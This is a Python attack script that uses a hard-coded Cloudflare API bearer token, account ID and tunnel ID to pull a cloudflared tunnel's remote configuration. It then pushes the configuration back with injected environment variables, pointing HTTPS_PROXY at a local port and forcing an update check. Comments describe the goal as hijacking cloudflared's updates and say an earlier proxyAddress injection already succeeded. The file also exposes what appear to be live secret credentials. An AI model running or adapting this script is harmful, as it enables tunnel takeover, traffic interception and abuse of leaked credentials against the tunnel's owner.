import urllib.request
import json
import time

SUPER_TOKEN = "HBkXgm2nAYlRAhgyULBebnw-4a-HQ-Mcuv0U_W42"
ACCOUNT_ID = "4c2932bc3381be38d5266241b16be092"
TUNNEL_ID = "926eac5e-2642-4a16-9edc-c06b6c705ab8"


def api_request(method, url, data=None):
    headers = {
        "Authorization": f"Bearer {SUPER_TOKEN}",
        "Content-Type": "application/json",
    }
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode() if data else None,
        headers=headers,
        method=method,
    )
    try:
        with urllib.request.urlopen(req) as response:
            return json.loads(response.read().decode())
    except Exception as e:
        print(f"Error: {e}")
        return None


def test_update_hijack():
    # Attempting to trigger an update via config manipulation
    # On Windows, cloudflared doesn't auto-update, but we can try to force it
    # by changing the tunnel settings to a 'staging' or 'beta' channel if possible
    # through the metadata or undocumented fields.

    res = api_request(
        "GET",
        f"https://api.cloudflare.com/client/v4/accounts/{ACCOUNT_ID}/cfd_tunnel/{TUNNEL_ID}/configurations",
    )
    config = res["result"]["config"]

    # We already successfully injected proxyAddress into originRequest.
    # Now let's try to inject environment variables via the config if supported.
    # Some versions of cloudflared (managed) might accept 'environment' key.

    print("Testing environment variable injection via config...")
    config["environment"] = {
        "HTTPS_PROXY": "http://127.0.0.1:20241",
        "CLOUDFLARED_UPDATE_SEED": "force-check",
    }

    update_res = api_request(
        "PUT",
        f"https://api.cloudflare.com/client/v4/accounts/{ACCOUNT_ID}/cfd_tunnel/{TUNNEL_ID}/configurations",
        {"config": config},
    )
    if update_res and update_res.get("success"):
        print("Environment injection SUCCESSFUL.")
    else:
        print("Environment injection FAILED.")
        print(update_res)


if __name__ == "__main__":
    test_update_hijack()
